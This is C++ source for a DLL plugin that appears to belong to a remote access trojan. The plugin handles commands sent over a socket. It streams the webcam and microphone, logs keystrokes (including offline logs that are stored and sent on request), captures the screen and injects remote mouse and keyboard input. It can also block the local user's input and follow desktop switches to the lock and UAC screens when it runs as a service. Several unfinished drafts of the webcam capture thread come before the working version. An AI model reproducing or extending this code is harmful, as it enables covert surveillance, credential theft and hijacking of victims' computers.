        bmi->bmiHeader.biHeight = 240;
        capSetVideoFormat(g_hCap, bmi, dwSize);
        
        // 保存 BMI 指针到 UserData 供回调使用
        capSetUserData(g_hCap, (LONG_PTR)&bmi->bmiHeader);
        
        capSetCallbackOnFrame(g_hCap, FrameCallbackProc);
        
        // 开始捕获 (虽然我们不用 Sequence 模式，但为了回调生效，需要...)
        // VFW 机制有点古老，通常用 capGrabFrame 或者设置回调
        // 这里我们简单起见，使用循环手动 Grab
        
        capSetCallbackOnFrame(g_hCap, NULL); // 清除上面的，我们用循环手动抓
        
        while (g_videoRunning) {
             if (capGrabFrame(g_hCap)) {
                 // 抓取成功，手动调用处理
                 // 但是 capGrabFrame 是同步的，且数据在内部缓存
                 // 我们需要 capEditCopy 吗？不，那会用到剪贴板，太吵了。
                 // 使用 capSetCallbackOnFrame 是对的，但需要消息循环。
             }
             // 由于我们在独立线程，没有消息循环，VFW 的回调可能不会触发
             // 所以我们需要一个消息循环
             MSG msg;
             if (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE)) {
                 TranslateMessage(&msg);
                 DispatchMessage(&msg);
             }
             
             // 实际上，最简单的办法是:
             // 设置回调 -> 运行一个带消息循环的线程
             // 但这里我们已经是在线程里了
             
             // 让我们尝试每秒抓几帧并手动获取数据
             // 重新连接并配置
         }
         
         // 修正方案：
         // 使用 capSetCallbackOnFrame 并进入消息循环
         // 或者在循环中 capGrabFrame 并没有直接提供数据指针的方法，除非用回调
    }
    
    // 清理
    if (g_hCap) {
        capDriverDisconnect(g_hCap);
        DestroyWindow(g_hCap);
        g_hCap = NULL;
    }
}

// 简单的单线程轮询实现（避免消息循环复杂性）
void VideoThreadSimple(SOCKET s) {
    g_hCap = capCreateCaptureWindowA("Cam", WS_POPUP, 0, 0, 320, 240, GetDesktopWindow(), 0);
    if (!g_hCap) return;
    
    if (capDriverConnect(g_hCap, 0)) {
        BITMAPINFO bmi = {0};
        bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
        bmi.bmiHeader.biWidth = 320;
        bmi.bmiHeader.biHeight = 240;
        bmi.bmiHeader.biPlanes = 1;
        bmi.bmiHeader.biBitCount = 24;
        bmi.bmiHeader.biCompression = BI_RGB;
        bmi.bmiHeader.biSizeImage = 320 * 240 * 3;
        
        capSetVideoFormat(g_hCap, &bmi, sizeof(BITMAPINFOHEADER));
        
        while (g_videoRunning) {
            if (capGrabFrame(g_hCap)) {
                 // 获取数据
                 // capGetVideoFormat 可以获取格式，但数据呢？
                 // 只能通过 capSetCallbackOnFrame
            }
            Sleep(100);
        }
        capDriverDisconnect(g_hCap);
    }
    DestroyWindow(g_hCap);
}

// 正确的 VFW 线程实现
void VideoThreadCorrect(SOCKET s) {
    g_hCap = capCreateCaptureWindowA("Cam", WS_POPUP, 0, 0, 320, 240, GetDesktopWindow(), 0);
    if (capDriverConnect(g_hCap, 0)) {
        BITMAPINFO bmi = {0};
        bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
        bmi.bmiHeader.biWidth = 320;
        bmi.bmiHeader.biHeight = 240;
        bmi.bmiHeader.biPlanes = 1;
        bmi.bmiHeader.biBitCount = 24;
        bmi.bmiHeader.biCompression = BI_RGB;
        bmi.bmiHeader.biSizeImage = 320 * 240 * 3;
        capSetVideoFormat(g_hCap, &bmi, sizeof(BITMAPINFOHEADER));
        
        capSetUserData(g_hCap, (LONG_PTR)&bmi.bmiHeader);
        capSetCallbackOnFrame(g_hCap, FrameCallbackProc);
        
        capPreviewRate(g_hCap, 100); // 100ms
        capPreview(g_hCap, TRUE); // 必须开启预览才会触发 FrameCallback
        
        MSG msg;
        while (g_videoRunning) {
            if (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE)) {
                TranslateMessage(&msg);
                DispatchMessage(&msg);
            }
            Sleep(10);
        }
        
        capSetCallbackOnFrame(g_hCap, NULL);
        capPreview(g_hCap, FALSE);
        capDriverDisconnect(g_hCap);
    }
    DestroyWindow(g_hCap);
}

void StartVideo(SOCKET s) {
    if (g_videoRunning) return;
    g_videoRunning = true;
    g_videoThread = std::thread(VideoThreadCorrect, s);
    g_videoThread.detach();
}

void StopVideo() {
    g_videoRunning = false;
}

#include "../../Common/Utils.h"
#include <windows.h>
#include <ctime>

// 全局桌面句柄，用于服务模式下的输入
static HDESK g_inputDesk = NULL;
static DWORD g_lastThreadId = 0;
static clock_t g_lastCheck = 0;

void UpdateInputDesktop() {
    if (!Formidable::IsRunAsService()) return;

    const int CHECK_INTERVAL = 100; // 100ms 检查一次桌面切换
    clock_t now = clock();
    if (!g_inputDesk || now - g_lastCheck > CHECK_INTERVAL) {
        g_lastCheck = now;
        // 如果桌面发生了切换（例如用户切换到了锁定界面或 UAC 界面），更新全局句柄
        if (Formidable::SwitchToDesktopIfChanged(g_inputDesk, GENERIC_ALL)) {
            g_lastThreadId = 0; // 强制重新设置线程桌面
        }
    }

    if (g_inputDesk) {
        DWORD currentThreadId = GetCurrentThreadId();
        if (currentThreadId != g_lastThreadId) {
            if (SetThreadDesktop(g_inputDesk)) {
                g_lastThreadId = currentThreadId;
            } else {
                OutputDebugStringA("[Multimedia] SetThreadDesktop failed\n");
            }
        }
    }
}

void ProcessMouseEvent(RemoteMouseEvent* ev) {
    UpdateInputDesktop();

    INPUT input = { 0 };
    input.type = INPUT_MOUSE;
    input.mi.dx = (LONG)ev->x;
    input.mi.dy = (LONG)ev->y;
    input.mi.mouseData = ev->data;
    input.mi.dwFlags = MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_VIRTUALDESK;

    // 默认都带上 MOVE，确保点击发生在正确的位置
    input.mi.dwFlags |= MOUSEEVENTF_MOVE;

    switch (ev->msg) {
    case WM_MOUSEMOVE:   /* 已经带了 MOVE 标志 */ break;
    case WM_LBUTTONDOWN: input.mi.dwFlags |= MOUSEEVENTF_LEFTDOWN; break;
    case WM_LBUTTONUP:   input.mi.dwFlags |= MOUSEEVENTF_LEFTUP; break;
    case WM_RBUTTONDOWN: input.mi.dwFlags |= MOUSEEVENTF_RIGHTDOWN; break;
    case WM_RBUTTONUP:   input.mi.dwFlags |= MOUSEEVENTF_RIGHTUP; break;
    case WM_MBUTTONDOWN: input.mi.dwFlags |= MOUSEEVENTF_MIDDLEDOWN; break;
    case WM_MBUTTONUP:   input.mi.dwFlags |= MOUSEEVENTF_MIDDLEUP; break;
    case WM_MOUSEWHEEL:  input.mi.dwFlags |= MOUSEEVENTF_WHEEL; break;
    default: return; // 忽略其他消息
    }

    if (!SendInput(1, &input, sizeof(INPUT))) {
        DWORD dwErr = GetLastError();
        char buf[64];
        sprintf_s(buf, "[Multimedia] SendInput Mouse failed: %d\n", dwErr);
        OutputDebugStringA(buf);
    }
}

void ProcessKeyEvent(RemoteKeyEvent* ev) {
    UpdateInputDesktop();

    INPUT input = { 0 };
    input.type = INPUT_KEYBOARD;
    input.ki.wVk = (WORD)ev->vk;
    input.ki.wScan = (WORD)MapVirtualKey((UINT)ev->vk, 0);
    input.ki.dwFlags = (ev->msg == WM_KEYUP || ev->msg == WM_SYSKEYUP) ? KEYEVENTF_KEYUP : 0;
    
    // 扩展键处理
    if (ev->vk == VK_LEFT || ev->vk == VK_RIGHT || ev->vk == VK_UP || ev->vk == VK_DOWN ||
        ev->vk == VK_PRIOR || ev->vk == VK_NEXT || ev->vk == VK_END || ev->vk == VK_HOME ||
        ev->vk == VK_INSERT || ev->vk == VK_DELETE || ev->vk == VK_DIVIDE || ev->vk == VK_NUMLOCK) {
        input.ki.dwFlags |= KEYEVENTF_EXTENDEDKEY;
    }

    if (!SendInput(1, &input, sizeof(INPUT))) {
        DWORD dwErr = GetLastError();
        char buf[64];
        sprintf_s(buf, "[Multimedia] SendInput Key failed: %d\n", dwErr);
        OutputDebugStringA(buf);
    }
}

extern "C" __declspec(dllexport) void WINAPI ModuleEntry(SOCKET s, CommandPkg* pkg) {
    if (pkg->cmd == CMD_VOICE_STREAM) {
        if (pkg->arg1 == 1) { // 1 = Start
            StartVoice(s);
        } else { // 0 = Stop
            StopVoice();
        }
    } else if (pkg->cmd == CMD_KEYLOG) {
        if (pkg->arg1 == 1) {
            StartKeylog(s);
        } else if (pkg->arg1 == 0) {
            StopKeylog();
        } else if (pkg->arg1 == 2) { // 获取当前缓存的数据
            SendResponse(s, CMD_KEYLOG, g_keyData.c_str(), (int)g_keyData.size());
            g_keyData.clear();
        } else if (pkg->arg1 == 3) { // 获取离线记录
            SendOfflineKeylog(s);
        } else if (pkg->arg1 == 4) { // 清空离线记录
            ClearOfflineKeylog();
        } else if (pkg->arg1 == 5) { // 控制离线记录开关
            g_offlineRecordEnabled = (pkg->arg2 != 0);
            // 如果禁用且文件已打开，关闭文件
            if (!g_offlineRecordEnabled && g_keylogFile) {
                fclose(g_keylogFile);
                g_keylogFile = NULL;
            }
        }
    } else if (pkg->cmd == CMD_SCREEN_CAPTURE) {
        if (pkg->arg1 == 1) { // Start
            // arg2: Capture Method (0=GDI, 1=DXGI)
            int newMethod = pkg->arg2;
            if (g_screenRunning && g_captureMethod != newMethod) {
                // 如果正在运行且模式改变，先停止
                g_captureMethod = newMethod;
                StopScreen();
                Sleep(200);
                StartScreen(s);
            } else {
                g_captureMethod = newMethod;
                StartScreen(s);
            }
        } else { // Stop
            StopScreen();
        }
    } else if (pkg->cmd == CMD_SCREEN_FPS) {
        g_screenFPS = pkg->arg1;
        if (g_screenFPS < 1) g_screenFPS = 1;
        if (g_screenFPS > 60) g_screenFPS = 60;
        // 如果正在运行，重启以应用新FPS
        if (g_screenRunning) {
            StopScreen();
            Sleep(100);
            StartScreen(s);
        }
    } else if (pkg->cmd == CMD_SCREEN_QUALITY) {
        switch (pkg->arg1) {
        case 0: // 限制1080P
            g_screenQuality = 0;
            break;
        case 1: // 原始分辨率
            g_screenQuality = 1;
            break;
        case 4: // 锁定/解锁输入
            g_inputLocked = !g_inputLocked;
            if (g_inputLocked) {
                BlockInput(TRUE);
            } else {
                BlockInput(FALSE);
            }
            break;
        }
    } else if (pkg->cmd == CMD_SCREEN_COMPRESS) {
        g_compressType = pkg->arg1; // 0=RAW, 1=JPEG
    } else if (pkg->cmd == CMD_MOUSE_EVENT) {
        ProcessMouseEvent((RemoteMouseEvent*)pkg->data);
    } else if (pkg->cmd == CMD_KEY_EVENT) {
        ProcessKeyEvent((RemoteKeyEvent*)pkg->data);
    } else if (pkg->cmd == CMD_VIDEO_STREAM) {
        if (pkg->arg1 == 1) { // Start
            StartVideo(s);
        } else { // Stop
            StopVideo();
        }
    }
}
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    return TRUE;
}
